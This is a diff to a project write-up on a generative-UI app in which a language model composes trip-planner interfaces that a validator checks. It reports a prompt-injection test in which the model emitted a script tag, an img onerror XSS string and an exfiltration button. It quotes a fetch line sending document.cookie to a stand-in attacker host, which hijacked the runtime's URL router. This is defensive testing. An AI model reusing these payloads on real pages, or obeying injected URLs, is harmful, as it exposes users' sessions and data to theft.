@@ -149,6 +149,8 @@ Everything the Session 14 widgets replay is real captured output under `proofs/`
 | `harness_selfcorrect.json` | `harness_selfcorrect.py` | the planner catches weak Berlin evidence and re-researches |
 | `generated_surface.json` | `generate_live.py` | a local model's output caught by the validator |
 | `gemini_surface.json` | `generate_gemini.py` | Gemini's raw output via the gateway |
+| `waypoint_turns.json` | `waypoint_turns.py` | three live turns of the UI-only app; the model composes `RouteMap` unprompted |
+| `waypoint_adversarial.json` | `waypoint_adversarial.py` | the model emits all three payloads; the validator refuses 3 of 19 and serves 16 |
 
 ```bash
 uv run python proofs/run_surface_proof.py    # writes proof.json, prints the table
@@ -254,7 +256,29 @@ turn 1 actually offered the user to tap, and the capture stops and says so if a
 turn composes nothing tappable. A test compares the chaining sentences in the
 script against the shell so the two cannot drift apart.
 
-TBD-TURNS-TABLE
+Every turn ran the same two-node graph — `content → surface`, journalled as
+`run_started · graph_patched · task_started content · task_succeeded content ·
+graph_patched · task_started surface · task_succeeded surface · graph_patched` —
+on `gemini_1` / `gemini-2.5-flash` through `glc_v3`. The `content` node produces
+domain-neutral data; the terminal `surface` node composes the interface.
+
+| Turn | Prompt / tap | Run | Components | Types composed |
+|---|---|---|---|---|
+| 1 | `Plan a 5-day trip to Japan. Ask me which region to focus on.` | `run-0bb55b7e7fc1` | 14 of 15 | `Text` `Row` `StatTile` `Timeline` `ProgressBar` `Column` `Button` |
+| 2 | tapped **“Tokyo & Kanto Region”** | `run-26099e0c2625` | 11 of 13 | `Text` **`RouteMap`** `Timeline` `ProgressBar` `Column` `Button` |
+| 3 | tapped **“Focus on Tokyo city”** | `run-26db8e2a9351` | 39 of 40 | `Text` `Card` `List` `Divider` `Column` `Button` |
+
+Eleven distinct component types across three turns, and each turn composed a
+different interface. Turn 1 offered five regions it was never given — nobody
+wrote a regions table — and turn 2 answered the tap with **`RouteMap`**, the
+contributed component, chosen from the catalog manifest alone.
+
+The "of" column is the validator, and it was doing real work on every turn: 1, 2
+and 1 components were refused. All four were the same mistake — the model put a
+literal string into `Text.text`, which the catalog declares as a `binding`, so
+each was refused under **data-not-code** (`binding must be {'$bind':
+'/pointer'}`) and dropped, while the other 14, 11 and 39 rendered. This is the
+wall working on ordinary non-hostile output, not just on attacks.
 
 **6. The adversarial prompt and the refusal.** Captured by
 [`proofs/waypoint_adversarial.py`](proofs/waypoint_adversarial.py). One hostile
@@ -285,7 +309,31 @@ model, it is also pinned in the hermetic suite
 is checked on every run of `uv run pytest -q` rather than only when a gateway
 happens to be up.
 
-TBD-ADVERSARIAL-LIVE
+**The live run is the strong form of this evidence, because the model complied.**
+In `run-ced46f8901fb` (`gemini-2.5-flash`) it emitted all three payloads: a
+`RawHtml` node wrapping a `<script>` tag, a heading whose text was an
+`<img src=x onerror=…>` string, and a `Button` carrying `exfiltrate_itinerary`.
+The validator refused **exactly those three of nineteen components**, each under
+its own invariant, and served the other **sixteen** — `Column`, `ProgressBar`,
+`RouteMap`, `Row`, `StatTile`, `Tabs`, `Text`, `Timeline`. The hostile interface
+rendered as a working trip planner with the attack removed from it. Had the model
+refused the payload instead, that would have been the model having manners, not a
+property of this system, which is why the capture reports the two separately.
+
+**Attacking the wall also found a hole that was not in the wall.** The first run
+of this attack never reached the composer. The runtime picks its frontier with
+regexes that match text *anywhere* in the prompt, and one of them fires on a URL
+next to a word like `fetch` or `read` — which is exactly the shape of an
+injection payload. The attack's own
+`fetch('https://attacker.example/x?c='+document.cookie)` matched that branch
+first, so the frontier became a `fetch_url` node **pointed at the attacker's
+host**, and the run died on a failed fetch with no surface composed at all. The
+injection never had to beat the validator because it never arrived there. An
+explicit `respond_as="ui"` is now honoured as a contract before the tool surface
+is consulted, and both directions are pinned: an injected URL cannot retarget a
+UI turn, and a plain-text caller still reaches the fetch skill. The lesson worth
+keeping is that the validator is not the first boundary a hostile prompt meets,
+and it was never the weakest one.
 
 **7. Honest verdict.**
 
@@ -330,6 +378,17 @@ validator boundary is worth keeping even if the generative part were dropped.
   as a blank page. A hostile surface is loudly refused and named. An *absent*
   one used to just render nothing. Each of the three now fails visibly, but a
   fixed screen has none of these failure modes to begin with.
+- **The wall is not the first boundary, and guarding it drew attention away from
+  the one that mattered.** The single worst finding in this work came from
+  attacking the validator and missing: the payload's own
+  `fetch('https://attacker.example/…')` matched the runtime's URL intent regex
+  before the UI path was ever chosen, and the agent tried to call the attacker's
+  host. Three invariants, eleven tests and a closed catalog were all irrelevant,
+  because nothing hostile had to reach them. A generative UI adds a second
+  attack surface *upstream* of the surface it validates — the prompt-to-frontier
+  router — and that surface is matched with regexes over attacker-influenced
+  text. It is fixed and pinned, but a fixed screen with no runtime intent
+  routing has no equivalent to get wrong.
 - **The renderer is duplicated three times.** `index.html`, `app.html` and
   `trip.html` each carry their own copy of a security-critical catalog-to-DOM
   mapping, and this contribution added a fourth component to all three by hand.
@@ -356,7 +415,7 @@ that make a model's output safe to render.
 
 ```bash
 uv sync
-uv run ruff check . && uv run pytest -q        # TBD-TEST-COUNT passed, no gateway needed
+uv run ruff check . && uv run pytest -q        # 138 passed, no gateway needed
 
 # the two live captures need glc_v3 on 8111 and Ollama with nomic-embed-text
 export GLC_BASE_URL=http://127.0.0.1:8111
